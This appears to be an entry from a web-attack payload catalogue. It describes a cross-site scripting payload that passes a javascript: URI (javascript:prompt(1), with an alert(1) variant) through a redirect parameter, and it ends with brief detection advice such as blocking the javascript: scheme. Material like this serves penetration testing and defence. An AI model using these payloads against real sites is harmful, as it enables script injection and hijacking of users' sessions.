---
id: 57011505-e644-4f7b-a256-e6720c2d1b8d
type: code
language: url-payload
verified: true
created_at: '2023-04-06T03:56:31.798872+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - javascript-protocol
  - xss
validated: true
---

# JavaScript-Protocol-XSS-Redirect

## Code

```url-payload
http://www.example.com/redirect.php?url=javascript:prompt(1)
```

## Description

Direct javascript: URI executes JS on redirect, for XSS or navigation hijack.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| prompt(1) | JS function | alert('XSS') |

## Usage

/redirect?url=javascript:alert(1). Executes immediately.

## Detection

- Blacklist javascript: scheme.
- SameSite cookies to limit context.

## Related

- [[procedures/Bypass-Open-URL-Redirection-Filters]]
